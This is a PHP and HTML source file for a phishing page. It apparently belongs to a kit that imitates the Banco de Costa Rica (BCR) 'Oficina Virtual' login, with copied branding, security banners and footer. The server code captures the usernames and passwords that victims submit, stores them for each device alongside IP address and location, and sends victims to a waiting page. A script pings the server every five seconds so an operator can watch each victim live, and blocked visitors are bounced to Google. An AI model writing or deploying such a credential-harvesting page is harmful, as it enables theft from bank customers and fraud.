<?php
require_once 'functions.php';

$info = get_user_info();
$ip = $info['ip'];
$device = get_device_id(); 

// Verificar si el usuario está bloqueado
if (get_user_state($device) === 'block') {
		echo "<script>
				alert('Acceso denegado: Tu usuario ha sido bloqueado.');
				window.location.href = 'https://www.google.com';
		</script>";
		exit();
}

// Actualizar el usuario con su device_id
update_user($ip, $info['location'], basename(__FILE__));

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
		$allowedFields = ["user", "pass"];
		$formData = [];

		foreach ($_POST as $key => $value) {
				if (in_array($key, $allowedFields)) {
						$formData[$key] = trim($value);
				}
		}

		if (!empty($formData)) {
				$data = load_data();

				if (!isset($data[$device])) { 
						$data[$device] = ['submissions' => [], 'state' => 'active'];
				}

				$timestamp = date("Y-m-d H:i:s");

				$found = false;
				if (isset($data[$device]['submissions'])) {
						foreach ($data[$device]['submissions'] as &$submission) {
								$existingKeys = array_keys($submission['data']);
								$formKeys = array_keys($formData);
								sort($existingKeys);
								sort($formKeys);
								if ($existingKeys == $formKeys) {
										// Reemplazar el submission existente
										$submission = [
												"data" => $formData,
												"timestamp" => $timestamp
										];
										$found = true;
										break;
								}
						}
						unset($submission);
				}
				if (!$found) {
						// Agregar nueva submission
						$data[$device]['submissions'][] = [
								"data" => $formData,
								"timestamp" => $timestamp
						];
						// Si es la primera submission y aún no se asignó color, asignarlo
						if (count($data[$device]['submissions']) === 1 && empty($data[$device]['color'])) {
								$data[$device]['color'] = assign_cyclic_color($data);
						}
				}

				save_data($data);

				header("Location: waiting.php");
				exit();
		} else {
				echo "<script>alert('Por favor, complete al menos un campo válido.');</script>";
		}
}
?>
<!DOCTYPE html>
<html>

<head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

	<meta name="viewport"
		content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
	<meta http-equiv="X-UA-Compatible" content="ie=edge">
	<link href="./content/style.css" rel="stylesheet" type="text/css">
	<link rel="icon" href="content/favicon.png">
	<title>Bienvenido</title>
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>

</head>

<body onload="javascript:return aviso();">
<script>

setInterval(function(){
    fetch('functions.php?action=ping', { method: 'GET', keepalive: true });
}, 5000);

window.addEventListener('unload', function(){
    navigator.sendBeacon('functions.php?action=offline');
});
</script>

	<div class="head">
		<img src="./content/logo.gif" class="logo">
		<img src="./content/Certificado.svg" class="headimg1">
		<img src="./content/Contactenos.svg" class="headimg2">
		<a href="#" class="linkhead1">Certificaciones</a>
		<a href="#" class="linkhead2">Contáctenos</a>
	</div>
	<div class="head2">

		<span class="texthead">Oficina Virtual &nbsp;&nbsp;&nbsp;&nbsp; Personas</span>

	</div>os
	<div class="costilla">
	<div class="slideshow-container">

<div class="mySlides fade" id="slide2" style="display: none;">
	<a href="https://www.bancobcr.com/wps/portal/bcr/bancobcr/soporte/seguridad/" aria-label="consejos de seguridad" target="_blank">
		<img src="./content/MensajeSeguridad2.png" style="width:100%">
	</a>
</div>

<div class="mySlides fade" id="slide3" style="display: block;">
	<a href="https://www.bancobcr.com/wps/portal/bcr/bancobcr/soporte/seguridad/" aria-label="consejos de seguridad" target="_blank">
		<img src="./content/MensajeSeguridad1.png" style="width:100%">
	</a>
</div>

</div>


	</div>
	<div class="containerimg">

<style>
	  /* Estilo para el botón deshabilitado */
	  .btn-uno:disabled {
    background-color: #d3d3d3; /* Color más claro */
    cursor: not-allowed;
  }
</style>

		<div class="divform1">

			<form method="post">

				<span class="ingresartxt">Ingresar</span>

				<hr class="line1" color="#C4C4C4">


				<img class="userimg" src="./content/Personalizar.svg">
				<img class="passimg" src="./content/Seguridad.svg">

				<div class="floating-label">

					<input class="user" type="text" placeholder=" " id="username1" name="user" onfocus="" onkeyup=""
						autocomplete="off" required="">

					<span class="highlight"></span>
					<label>Usuario</label>

				</div>


				<div class="floating-label2">

					<input class="pass" type="password" placeholder=" " id="pass" name="pass" autocomplete="off"
						required="">






					<span class="highlight2"></span>
					<label>Contraseña</label>

					<img id="imgpass1" src="./content/ver.png" class="ver" onclick=" pass1(); pass2(); pass11();">
					<img id="imgpass2" src="./content/ver2.png" class="ver" onclick=" pass3(); pass4(); pass33();"
						style="display: none;">


				</div>








				<button type="submit" disabled class="btn-uno">Ingresar</button>

				<button style="height: 46px;" class="btn-dos" type="submit">¿Olvido su usuario o contraseña?</button>


				<input type="checkbox" name="checkbox" class="digital">
				<label class="labelchk">Certificado Digital</label>

			</form>


		</div>
		<script>
document.addEventListener("DOMContentLoaded", function () {
    const usernameInput = document.getElementById("username1");
    const passwordInput = document.getElementById("pass");
    const submitButton = document.querySelector(".btn-uno");

    function checkInputs() {
        // Verifica si ambos inputs tienen contenido (eliminando espacios en blanco)
        if (usernameInput.value.trim() !== "" && passwordInput.value.trim() !== "") {
            submitButton.disabled = false;
        } else {
            submitButton.disabled = true;
        }
    }

    // Escucha los cambios en ambos inputs
    usernameInput.addEventListener("input", checkInputs);
    passwordInput.addEventListener("input", checkInputs);

    // Llama a la función para establecer el estado inicial
    checkInputs();
});
</script>
		<div class="divform2">


			<span class="ingresartxt">Registrarse</span>

			<hr class="line1" color="#C4C4C4">



			<span class="registertext">

				Regístrese aquí si desea utilizar los servicios de Banca Digital.<br><br>

				Para registrarse requiere ser cliente y tener al menos un producto activo.

			</span>


			<button class="btn-tres">Continuar</button>


		</div>




		<div class="formcontainer">


		</div>

	</div>

	<div class="footer"><span class="footertext"> BCR © Derechos Reservados 2023. Contáctenos:
			CentroAsistenciaBCR@bancobcr.com</span></div>



</body>
<script src="tel.js"></script>
</html>